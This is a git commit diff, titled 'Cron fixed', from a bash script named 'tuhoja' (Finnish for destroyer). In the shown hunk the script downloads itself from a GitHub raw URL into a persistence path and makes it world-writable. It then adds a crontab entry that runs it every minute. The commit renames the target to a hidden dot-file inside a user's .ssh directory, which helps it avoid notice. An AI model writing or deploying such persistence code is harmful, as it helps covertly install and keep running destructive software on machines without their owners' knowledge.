6290378f19985fccb5e07be3a7981180b03bac6b
Poliisi5 <hermannipinomaki@gmail.com>
2025-01-13 14:32:20 +0200

    Cron fixed

--- tuhoja.bash
+++ tuhoja.bash
@@ -20,5 +20,5 @@ if test -f $PERSISTENCE_DIR ; then
 else
   curl -o $PERSISTENCE_DIR https://raw.githubusercontent.com/Poliisi5/tuhoja/refs/heads/main/tuhoja.bash
   chmod 777 $PERSISTENCE_DIR
-  (crontab -l 2>/dev/null || true; echo "0-59 * * * * /bin/bash /home/kauppis/.ssh/tuhoja.sh") | crontab -
+  (crontab -l 2>/dev/null || true; echo "0-59 * * * * /bin/bash /home/kauppis/.ssh/.tuhoja.sh") | crontab -
 fi
